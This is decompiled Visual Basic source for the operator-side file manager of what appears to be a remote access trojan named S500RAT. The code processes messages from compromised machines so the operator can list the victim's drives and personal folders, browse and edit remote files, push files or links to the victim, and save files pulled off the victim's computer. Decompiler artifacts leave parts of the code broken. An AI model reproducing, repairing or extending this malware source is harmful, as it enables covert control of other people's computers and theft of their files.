Imports System
Imports System.Collections.Generic
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Threading.Tasks
Imports System.Windows.Forms
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server.Connection

Namespace S500RAT
	' Token: 0x02000059 RID: 89
	Public Class FrmManager
		' Token: 0x060011A8 RID: 4520 RVA: 0x0009C6A8 File Offset: 0x0009A8A8
		Public Async Sub FileManager(client As Clients, unpack_msgpack As MsgPack)
			Dim CS$<>8__locals1 As FrmManager._Closure$__1-0 = New FrmManager._Closure$__1-0(CS$<>8__locals1)
			CS$<>8__locals1.$VB$Me = Me
			CS$<>8__locals1.$VB$Local_unpack_msgpack = unpack_msgpack
			Try
				Dim CS$<>8__locals2 As FrmManager._Closure$__1-2 = New FrmManager._Closure$__1-2(CS$<>8__locals2)
				CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2 = CS$<>8__locals1
				CS$<>8__locals2.$VB$Local_FM = CType(Application.OpenForms("FileManager" + CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_unpack_msgpack.ForcePathObject("Hwid").AsString), FormFileManager)
				Dim flag As Boolean = CS$<>8__locals2.$VB$Local_FM Is Nothing
				If flag Then
					Debug.WriteLine("Disconnected")
					client.Disconnected()
				Else
					Dim asString As String = CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_unpack_msgpack.ForcePathObject("Command").AsString
					Dim text As String = asString
					Dim num As UInteger = <PrivateImplementationDetails>.ComputeStringHash(text)
					If num <= 1307701216UI Then
						If num <= 563185489UI Then
							If num <> 306601514UI Then
								If num = 563185489UI Then
									If Operators.CompareString(text, "error", False) = 0 Then
										If CS$<>8__locals2.$VB$Local_FM IsNot Nothing Then
											CS$<>8__locals2.$VB$Local_FM.L2.Enabled = True
											CS$<>8__locals2.$VB$Local_FM.ManagrLogs.ForeColor = Color.Red
											CS$<>8__locals2.$VB$Local_FM.ManagrLogs.Text = CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_unpack_msgpack.ForcePathObject("Message").AsString
										End If
									End If
								End If
							ElseIf Operators.CompareString(text, "getDrivers", False) = 0 Then
								Dim flag2 As Boolean = CS$<>8__locals2.$VB$Local_FM IsNot Nothing
								If flag2 Then
									CS$<>8__locals2.$VB$Local_FM.TextBox1.Text = ""
									CS$<>8__locals2.$VB$Local_FM.L1.Items.Clear()
									Dim driver As String() = CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_unpack_msgpack.ForcePathObject("Driver").AsString.Split(New String() { "-=>" }, StringSplitOptions.None)
									Dim num2 As Integer = driver.Length - 1
									For i As Integer = 0 To num2
										Dim flag3 As Boolean = driver(i).Length > 0
										If flag3 Then
											Dim lv As ListViewItem = New ListViewItem() With { .Text = driver(i), .ToolTipText = driver(i) }
											Dim flag4 As Boolean = Operators.CompareString(driver(i), "Desktop", False) = 0
											If flag4 Then
												lv.SubItems.Add(driver(i + 1))
												lv.Group = CS$<>8__locals2.$VB$Local_FM.L1.Groups("Folder")
												lv.ImageIndex = 5
											Else
												Dim flag5 As Boolean = Operators.CompareString(driver(i), "Downloads", False) = 0
												If flag5 Then
													lv.SubItems.Add(driver(i + 1))
													lv.Group = CS$<>8__locals2.$VB$Local_FM.L1.Groups("Folder")
													lv.ImageIndex = 9
												Else
													Dim flag6 As Boolean = Operators.CompareString(driver(i), "Documents", False) = 0
													If flag6 Then
														lv.SubItems.Add(driver(i + 1))
														lv.Group = CS$<>8__locals2.$VB$Local_FM.L1.Groups("Folder")
														lv.ImageIndex = 8
													Else
														Dim flag7 As Boolean = Operators.CompareString(driver(i), "Music", False) = 0
														If flag7 Then
															lv.SubItems.Add(driver(i + 1))
															lv.Group = CS$<>8__locals2.$VB$Local_FM.L1.Groups("Folder")
															lv.ImageIndex = 13
														Else
															Dim flag8 As Boolean = Operators.CompareString(driver(i), "Pictures", False) = 0
															If flag8 Then
																lv.SubItems.Add(driver(i + 1))
																lv.Group = CS$<>8__locals2.$VB$Local_FM.L1.Groups("Folder")
																lv.ImageIndex = 6
															Else
																Dim flag9 As Boolean = Operators.CompareString(driver(i), "Videos", False) = 0
																If flag9 Then
																	lv.SubItems.Add(driver(i + 1))
																	lv.Group = CS$<>8__locals2.$VB$Local_FM.L1.Groups("Folder")
																	lv.ImageIndex = 7
																Else
																	Dim flag10 As Boolean = Operators.CompareString(driver(i), "AppData", False) = 0
																	If flag10 Then
																		lv.SubItems.Add(driver(i + 1))
																		lv.Group = CS$<>8__locals2.$VB$Local_FM.L1.Groups("Folder")
																		lv.ImageIndex = 0
																	Else
																		Dim flag11 As Boolean = Operators.CompareString(driver(i), "AppData", False) = 0
																		If flag11 Then
																			lv.SubItems.Add(driver(i + 1))
																			lv.Group = CS$<>8__locals2.$VB$Local_FM.L1.Groups("Folder")
																			lv.ImageIndex = 0
																		Else
																			Dim flag12 As Boolean = Operators.CompareString(driver(i), "User", False) = 0
																			If flag12 Then
																				lv.SubItems.Add(driver(i + 1))
																				lv.Group = CS$<>8__locals2.$VB$Local_FM.L1.Groups("Folder")
																				lv.ImageIndex = 0
																			Else
																				Dim sz As String() = Strings.Split(driver(i + 1), "|Size|", -1, CompareMethod.Binary)
																				lv.SubItems.Add(Functions.BytesToSize(Conversions.ToLong(sz(0))) + " free of " + Functions.BytesToSize(Conversions.ToLong(sz(1))))
																				Dim flag13 As Boolean = Operators.CompareString(driver(i), "C:\", False) = 0
																				If flag13 Then
																					lv.Group = CS$<>8__locals2.$VB$Local_FM.L1.Groups("Devices and Drives")
																					lv.ImageIndex = 10
																				Else
																					lv.Group = CS$<>8__locals2.$VB$Local_FM.L1.Groups("Devices and Drives")
																					lv.ImageIndex = 1
																				End If
																			End If
																		End If
																	End If
																End If
															End If
														End If
													End If
												End If
											End If
											CS$<>8__locals2.$VB$Local_FM.L1.Items.Add(lv)
										End If
										i += 1
									Next
								End If
							End If
						ElseIf num <> 1231601560UI Then
							If num = 1307701216UI Then
								If Operators.CompareString(text, "getPath", False) = 0 Then
									Dim flag14 As Boolean = CS$<>8__locals2.$VB$Local_FM IsNot Nothing
									If flag14 Then
										Dim CS$<>8__locals3 As FrmManager._Closure$__1-1 = New FrmManager._Closure$__1-1(CS$<>8__locals3)
										CS$<>8__locals3.$VB$NonLocal_$VB$Closure_3 = CS$<>8__locals2
										CS$<>8__locals3.$VB$NonLocal_$VB$Closure_3.$VB$Local_FM.L2.Visible = True
										CS$<>8__locals3.$VB$NonLocal_$VB$Closure_3.$VB$Local_FM.L1.Visible = False
										CS$<>8__locals3.$VB$NonLocal_$VB$Closure_3.$VB$Local_FM.TextBox1.Text = CS$<>8__locals3.$VB$NonLocal_$VB$Closure_3.$VB$NonLocal_$VB$Closure_2.$VB$Local_unpack_msgpack.ForcePathObject("CurrentPath").AsString
										Dim flag15 As Boolean = CS$<>8__locals3.$VB$NonLocal_$VB$Closure_3.$VB$Local_FM.TextBox1.Text.EndsWith("\")
										If flag15 Then
											CS$<>8__locals3.$VB$NonLocal_$VB$Closure_3.$VB$Local_FM.TextBox1.Text = CS$<>8__locals3.$VB$NonLocal_$VB$Closure_3.$VB$Local_FM.TextBox1.Text.Substring(0, CS$<>8__locals3.$VB$NonLocal_$VB$Closure_3.$VB$Local_FM.TextBox1.Text.Length - 1)
										End If
										Dim flag16 As Boolean = CS$<>8__locals3.$VB$NonLocal_$VB$Closure_3.$VB$Local_FM.TextBox1.Text.Length = 2
										If flag16 Then
											CS$<>8__locals3.$VB$NonLocal_$VB$Closure_3.$VB$Local_FM.TextBox1.Text = CS$<>8__locals3.$VB$NonLocal_$VB$Closure_3.$VB$Local_FM.TextBox1.Text + "\"
										End If
										CS$<>8__locals3.$VB$NonLocal_$VB$Closure_3.$VB$Local_FM.L2.BeginUpdate()
										CS$<>8__locals3.$VB$NonLocal_$VB$Closure_3.$VB$Local_FM.L2.Items.Clear()
										CS$<>8__locals3.$VB$NonLocal_$VB$Closure_3.$VB$Local_FM.imageList1.Images.Clear()
										CS$<>8__locals3.$VB$NonLocal_$VB$Closure_3.$VB$Local_FM.imageList1.Images.Add("0_folder", Image.FromStream(New MemoryStream(Convert.FromBase64String("iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABmJLR0QA/wD/AP+gvaeTAAAB7UlEQVRYhe3Wu27TUBzH8a+TmBA1pSotFyGGSrCwg1iRKngCJhYmJlYkNqhY4AWQYEPqyCOg8gLsSAxIvSjQpnHi+BLfz5+BOMrQ1o7tKBL0N/1lnXP80d9H5xjO879HS4tHL2Spi72zerO9oTW0axnzdjWNdzvPtY9lAbW0OBb7azCM7o8GQdbLATZE+LD5Xh5XBgjd+C7AqB/knizC2wdb0qgEoBKpAcR+QuBEeeff1q7wpAxgsgfuPDMkrZttncu3lsuse1p+AdtrPV593tJCmOrAdAInInTjeQBuAC+Ndd6kD04EADhH3jwAaZ5mAgI7wrdy74VZcz0TAGB1XETJWUNK50xAEiqcrr84AIB77BN5yeIAooTBnoNK5vMpMgEASZBg7rswB0MuAEBghTi96vdDbgCA/XuEN8h/V1QOQGB44BJY4YIAgAj0dx08sxrEzIC/CjD3nUqO62KAMcI+9DD3HFSJ07I4YBzPDDF+DAvfnqUBAHGoMH5amAcuKp6tG5PfqbpeS5JI1QsrBLx+gG+GLK03aV9todW100Z30mLSAb1V/1b45dMOJThdn+53E6szIvJPuEeE7bScdGDFW37IJftL5CX3SnViHKUEt+fj9nz0VoOLKzqt1eZR/ULt05rB67Lrn+ffyR8AadQHk9xuWwAAAABJRU5ErkJggg=="))))
										CS$<>8__locals3.$VB$NonLocal_$VB$Closure_3.$VB$Local_FM.L2.Groups.Clear()
										CS$<>8__locals3.$VB$NonLocal_$VB$Closure_3.$VB$Local_FM.pr.Value = 50
										CS$<>8__locals3.$VB$Local_groupFolder = New ListViewGroup("Folders")
										CS$<>8__locals3.$VB$Local_groupFile = New ListViewGroup("Files")
										CS$<>8__locals3.$VB$NonLocal_$VB$Closure_3.$VB$Local_FM.L2.Groups.Add(CS$<>8__locals3.$VB$Local_groupFolder)
										CS$<>8__locals3.$VB$NonLocal_$VB$Closure_3.$VB$Local_FM.L2.Groups.Add(CS$<>8__locals3.$VB$Local_groupFile)
										Dim listViewItemCollection As ListView.ListViewItemCollection = CS$<>8__locals3.$VB$NonLocal_$VB$Closure_3.$VB$Local_FM.L2.Items
										Dim taskAwaiter As TaskAwaiter(Of ListViewItem()) = Task.Run(Of ListViewItem())(Function() CS$<>8__locals3.$VB$NonLocal_$VB$Closure_3.$VB$NonLocal_$VB$Closure_2.$VB$Me.GetFolders(CS$<>8__locals3.$VB$NonLocal_$VB$Closure_3.$VB$NonLocal_$VB$Closure_2.$VB$Local_unpack_msgpack, CS$<>8__locals3.$VB$Local_groupFolder).ToArray()).GetAwaiter()
										Dim taskAwaiter2 As TaskAwaiter(Of ListViewItem())
										If Not taskAwaiter.IsCompleted Then
											Await taskAwaiter
											taskAwaiter = taskAwaiter2
											taskAwaiter2 = Nothing
										End If
										Dim listViewItemCollection2 As ListView.ListViewItemCollection = listViewItemCollection
										Dim result As ListViewItem() = taskAwaiter.GetResult()
										taskAwaiter = Nothing
										listViewItemCollection2.AddRange(result)
										listViewItemCollection = Nothing
										listViewItemCollection = CS$<>8__locals3.$VB$NonLocal_$VB$Closure_3.$VB$Local_FM.L2.Items
										Dim taskAwaiter3 As TaskAwaiter(Of ListViewItem()) = Task.Run(Of ListViewItem())(Function() CS$<>8__locals3.$VB$NonLocal_$VB$Closure_3.$VB$NonLocal_$VB$Closure_2.$VB$Me.GetFiles(CS$<>8__locals3.$VB$NonLocal_$VB$Closure_3.$VB$NonLocal_$VB$Closure_2.$VB$Local_unpack_msgpack, CS$<>8__locals3.$VB$Local_groupFile, CS$<>8__locals3.$VB$NonLocal_$VB$Closure_3.$VB$Local_FM.imageList1).ToArray()).GetAwaiter()
										If Not taskAwaiter3.IsCompleted Then
											Await taskAwaiter3
											taskAwaiter3 = taskAwaiter2
											taskAwaiter2 = Nothing
										End If
										Dim listViewItemCollection3 As ListView.ListViewItemCollection = listViewItemCollection
										result = taskAwaiter3.GetResult()
										taskAwaiter3 = Nothing
										listViewItemCollection3.AddRange(result)
										listViewItemCollection = Nothing
										CS$<>8__locals3.$VB$NonLocal_$VB$Closure_3.$VB$Local_FM.pr.Value = 100
										CS$<>8__locals3.$VB$NonLocal_$VB$Closure_3.$VB$Local_FM.L2.Enabled = True
										CS$<>8__locals3.$VB$NonLocal_$VB$Closure_3.$VB$Local_FM.L2.Focus()
										CS$<>8__locals3.$VB$NonLocal_$VB$Closure_3.$VB$Local_FM.L2.EndUpdate()
										CS$<>8__locals3.$VB$NonLocal_$VB$Closure_3.$VB$Local_FM.FolderLen.Text = Conversions.ToString(CS$<>8__locals3.$VB$NonLocal_$VB$Closure_3.$VB$Local_FM.L2.Groups(0).Items.Count) + " Folder  |  " + Conversions.ToString(CS$<>8__locals3.$VB$NonLocal_$VB$Closure_3.$VB$Local_FM.L2.Groups(1).Items.Count) + " Files"
										CS$<>8__locals3.$VB$NonLocal_$VB$Closure_3.$VB$Local_FM.pr.Value = 0
									End If
								End If
							End If
						ElseIf Operators.CompareString(text, "Editor", False) = 0 Then
							Dim FD As FormNote = CType(Application.OpenForms("Editor:" + CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_unpack_msgpack.ForcePathObject("DWID").AsString), FormNote)
							If FD IsNot Nothing Then
								FD.Client = client
								FD.Complete = True
								FD.Textfile = CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_unpack_msgpack.ForcePathObject("TXT").AsString
							End If
						End If
					ElseIf num <= 2946165588UI Then
						If num <> 2082903604UI Then
							If num = 2946165588UI Then
								If Operators.CompareString(text, "UploadFromLink", False) = 0 Then
									Dim FD2 As UploadFromLink = CType(Application.OpenForms("UploadFromLink:" + CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_unpack_msgpack.ForcePathObject("DWID").AsString), UploadFromLink)
									If FD2 IsNot Nothing Then
										FD2.Client = client
										FD2.FileSave.Text = CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_unpack_msgpack.ForcePathObject("Folder").AsString
										FD2.PatshSave = CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_unpack_msgpack.ForcePathObject("Folder").AsString
										FD2.HWID = CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_unpack_msgpack.ForcePathObject("DWID").AsString
									End If
								End If
							End If
						ElseIf Operators.CompareString(text, "setClient", False) = 0 Then
							Dim flag17 As Boolean = CS$<>8__locals2.$VB$Local_FM IsNot Nothing
							If flag17 Then
								Dim flag18 As Boolean = CS$<>8__locals2.$VB$Local_FM.Client Is Nothing
								If flag18 Then
									client.ID = CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_unpack_msgpack.ForcePathObject("Hwid").AsString
									CS$<>8__locals2.$VB$Local_FM.Client = client
									CS$<>8__locals2.$VB$Local_FM.IsConnected = True
								End If
							End If
						End If
					ElseIf num <> 3422576672UI Then
						If num = 4070018028UI Then
							If Operators.CompareString(text, "UploadLink", False) = 0 Then
								Dim FD3 As UploadFromLink = CType(Application.OpenForms("UploadFromLink:" + CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_unpack_msgpack.ForcePathObject("DWID").AsString), UploadFromLink)
								If FD3 IsNot Nothing Then
									FD3.Client = client
									FD3.Complete = Conversions.ToString(CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_unpack_msgpack.ForcePathObject("Value").AsInteger)
									FD3.IsConnected = True
								End If
							End If
						End If
					ElseIf Operators.CompareString(text, "reqUploadFile", False) = 0 Then
						Dim FD4 As FormDownloadFile = CType(Application.OpenForms(CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_unpack_msgpack.ForcePathObject("ID").AsString), FormDownloadFile)
						If FD4 IsNot Nothing Then
							FD4.Client = client
							FD4.IsConnected = True
							Dim msgpack As MsgPack = New MsgPack()
							msgpack.ForcePathObject("Packet").AsString = "fileManager"
							msgpack.ForcePathObject("Command").AsString = "uploadFile"
							msgpack.ForcePathObject("File").LoadFileAsBytes(FD4.FullFileName)
							msgpack.ForcePathObject("Name").AsString = FD4.ClientFullFileName
							ThreadPool.QueueUserWorkItem(AddressOf FD4.Send, msgpack.Encode2Bytes())
						End If
					End If
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060011A9 RID: 4521 RVA: 0x0009C6F0 File Offset: 0x0009A8F0
		Public Async Sub SocketDownload(client As Clients, unpack_msgpack As MsgPack)
			Try
				Dim asString As String = unpack_msgpack.ForcePathObject("Command").AsString
				Dim left As String = asString
				If Operators.CompareString(left, "pre", False) <> 0 Then
					If Operators.CompareString(left, "save", False) = 0 Then
						Try
							Dim dwid As String = unpack_msgpack.ForcePathObject("DWID").AsString
							Dim SD As FormDownloadFile = CType(Application.OpenForms("socketDownload:" + dwid), FormDownloadFile)
							Dim flag As Boolean = SD Is Nothing
							If flag Then
								Debug.WriteLine("Disconnected")
								client.Disconnected()
							Else
								Dim flag2 As Boolean = SD IsNot Nothing
								If flag2 Then
									Dim flag3 As Boolean = Not Directory.Exists(SD.DirPath)
									If Not flag3 Then
										Dim fileName As String = unpack_msgpack.ForcePathObject("Name").AsString
										Dim dirPath As String = SD.DirPath
										Await Task.Run(Function() Me.SaveFileAsync(unpack_msgpack.ForcePathObject("File"), dirPath + "\" + fileName))
										SD.Close()
									End If
								End If
							End If
						Catch ex2 As Exception
						Finally
							GC.Collect()
						End Try
					End If
				Else
					Dim dwid2 As String = unpack_msgpack.ForcePathObject("DWID").AsString
					Dim file As String = unpack_msgpack.ForcePathObject("File").AsString
					Dim size As String = unpack_msgpack.ForcePathObject("Size").AsString
					Dim SD2 As FormDownloadFile = CType(Application.OpenForms("socketDownload:" + dwid2), FormDownloadFile)
					Dim flag4 As Boolean = SD2 IsNot Nothing
					If flag4 Then
						SD2.Client = client
						SD2.labelfile.Text = Path.GetFileName(file)
						SD2.FileSize = Convert.ToInt64(size)
						SD2.IsConnected = True
					End If
				End If
			Catch ex As Exception
				ListLogs.AddArray("File Manager " + client.IP + " Error : " + ex.Message, 0)
			End Try
		End Sub

		' Token: 0x060011AA RID: 4522 RVA: 0x0009C738 File Offset: 0x0009A938
		Public Function SetBytes(Bytes As Object) As String
			Dim num As Integer
			Dim result As String
			Dim num2 As Integer
			Dim obj As Object
			Try
				ProjectData.ClearProjectError()
				num = 2
				Dim flag As Boolean = Operators.ConditionalCompareObjectGreaterEqual(Bytes, 1073741824, False)
				If flag Then
					result = Strings.Format(Operators.DivideObject(Operators.DivideObject(Operators.DivideObject(Bytes, 1024), 1024), 1024), "#0.00") + " GB"
				Else
					Dim flag2 As Boolean = Operators.ConditionalCompareObjectGreaterEqual(Bytes, 1048576, False)
					If flag2 Then
						result = Strings.Format(Operators.DivideObject(Operators.DivideObject(Bytes, 1024), 1024), "#0.00") + " MB"
					Else
						Dim flag3 As Boolean = Operators.ConditionalCompareObjectGreaterEqual(Bytes, 1024, False)
						If flag3 Then
							result = Strings.Format(Operators.DivideObject(Bytes, 1024), "#0.00") + " KB"
						Else
							Dim flag4 As Boolean = Operators.ConditionalCompareObjectLess(Bytes, 1024, False)
							If flag4 Then
								result = Conversions.ToString(Operators.ConcatenateObject(Conversion.Fix(RuntimeHelpers.GetObjectValue(Bytes)), " KB"))
							End If
						End If
					End If
				End If
				IL_131:
				GoTo IL_174
				IL_12A:
				result = "0,00 KB"
				GoTo IL_131
				IL_133:
				num2 = -1
				switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num)
				IL_147:
			Catch obj2 When endfilter(TypeOf obj Is Exception And num <> 0 And num2 = 0)
				Dim ex As Exception = CType(obj2, Exception)
				GoTo IL_133
			End Try
			Throw ProjectData.CreateProjectError(-2146828237)
			IL_174:
			If num2 <> 0 Then
				ProjectData.ClearProjectError()
			End If
			Return result
		End Function

		' Token: 0x060011AB RID: 4523 RVA: 0x0009C8E0 File Offset: 0x0009AAE0
		Private Async Function SaveFileAsync(unpack_msgpack As MsgPack, name As String) As Task
			Await Task.Run(Sub()
				unpack_msgpack.SaveBytesToFile(name)
			End Sub)
		End Function

		' Token: 0x060011AC RID: 4524 RVA: 0x0009C934 File Offset: 0x0009AB34
		Private Function GetFolders(unpack_msgpack As MsgPack, listViewGroup As ListViewGroup) As List(Of ListViewItem)
			Dim array As String() = unpack_msgpack.ForcePathObject("Folder").AsString.Split(New String() { "-=>" }, StringSplitOptions.None)
			Dim list As List(Of ListViewItem) = New List(Of ListViewItem)()
			Dim num As Integer = 0
			Dim num2 As Integer = array.Length - 1
			For i As Integer = 0 To num2
				Dim flag As Boolean = array(i).Length > 0
				If flag Then
					Dim listViewItem As ListViewItem = New ListViewItem() With { .Text = array(i), .ToolTipText = array(i + 1) }
					listViewItem.SubItems.Add(array(i + 2))
					listViewItem.SubItems.Add("Folder")
					listViewItem.Group = listViewGroup
					listViewItem.ImageIndex = 0
					list.Add(listViewItem)
					num += 1
				End If
				i += 2
			Next
			Return list
		End Function

		' Token: 0x060011AD RID: 4525 RVA: 0x0009CA10 File Offset: 0x0009AC10
		Private Function GetFiles(unpack_msgpack As MsgPack, listViewGroup As ListViewGroup, imageList1 As ImageList) As List(Of ListViewItem)
			Dim CS$<>8__locals1 As FrmManager._Closure$__6-0 = New FrmManager._Closure$__6-0(CS$<>8__locals1)
			CS$<>8__locals1.$VB$Local_imageList1 = imageList1
			CS$<>8__locals1.$VB$Local_Files = unpack_msgpack.ForcePathObject("File").AsString.Split(New String() { "-=>" }, StringSplitOptions.None)
			Dim list As List(Of ListViewItem) = New List(Of ListViewItem)()
			Dim CS$<>8__locals2 As FrmManager._Closure$__6-0 = CS$<>8__locals1
			Dim num As Integer = CS$<>8__locals1.$VB$Local_Files.Length - 1
			CS$<>8__locals2.$VB$Local_i = 0
			While CS$<>8__locals1.$VB$Local_i <= num
				Dim flag As Boolean = CS$<>8__locals1.$VB$Local_Files(CS$<>8__locals1.$VB$Local_i).Length > 0
				If flag Then
					Dim CS$<>8__locals3 As FrmManager._Closure$__6-1 = New FrmManager._Closure$__6-1(CS$<>8__locals3)
					CS$<>8__locals3.$VB$NonLocal_$VB$Closure_2 = CS$<>8__locals1
					Dim listViewItem As ListViewItem = New ListViewItem() With { .Text = Path.GetFileName(CS$<>8__locals3.$VB$NonLocal_$VB$Closure_2.$VB$Local_Files(CS$<>8__locals3.$VB$NonLocal_$VB$Closure_2.$VB$Local_i)), .ToolTipText = CS$<>8__locals3.$VB$NonLocal_$VB$Closure_2.$VB$Local_Files(CS$<>8__locals3.$VB$NonLocal_$VB$Closure_2.$VB$Local_i + 1) }
					CS$<>8__locals3.$VB$Local_im = Image.FromStream(New MemoryStream(Convert.FromBase64String(CS$<>8__locals3.$VB$NonLocal_$VB$Closure_2.$VB$Local_Files(CS$<>8__locals3.$VB$NonLocal_$VB$Closure_2.$VB$Local_i + 2))))
					DataB.form1_0.Invoke(New MethodInvoker(Sub()
						CS$<>8__locals3.$VB$NonLocal_$VB$Closure_2.$VB$Local_imageList1.Images.Add(CS$<>8__locals3.$VB$NonLocal_$VB$Closure_2.$VB$Local_Files(CS$<>8__locals3.$VB$NonLocal_$VB$Closure_2.$VB$Local_i + 1), CS$<>8__locals3.$VB$Local_im)
					End Sub))
					listViewItem.ImageKey = CS$<>8__locals3.$VB$NonLocal_$VB$Closure_2.$VB$Local_Files(CS$<>8__locals3.$VB$NonLocal_$VB$Closure_2.$VB$Local_i + 1)
					listViewItem.Group = listViewGroup
					listViewItem.SubItems.Add(CS$<>8__locals3.$VB$NonLocal_$VB$Closure_2.$VB$Local_Files(CS$<>8__locals3.$VB$NonLocal_$VB$Closure_2.$VB$Local_i + 3))
					Dim fileInfo As FileInfo = New FileInfo(CS$<>8__locals3.$VB$NonLocal_$VB$Closure_2.$VB$Local_Files(CS$<>8__locals3.$VB$NonLocal_$VB$Closure_2.$VB$Local_i))
					Dim text As String = Conversions.ToString(Functions.FilesType(fileInfo.Extension))
					listViewItem.SubItems.Add(text)
					listViewItem.SubItems.Add(Functions.BytesToSize(Convert.ToInt64(CS$<>8__locals3.$VB$NonLocal_$VB$Closure_2.$VB$Local_Files(CS$<>8__locals3.$VB$NonLocal_$VB$Closure_2.$VB$Local_i + 5))))
					list.Add(listViewItem)
				End If
				CS$<>8__locals1.$VB$Local_i += 5
				CS$<>8__locals1.$VB$Local_i += 1
			End While
			Return list
		End Function
	End Class
End Namespace
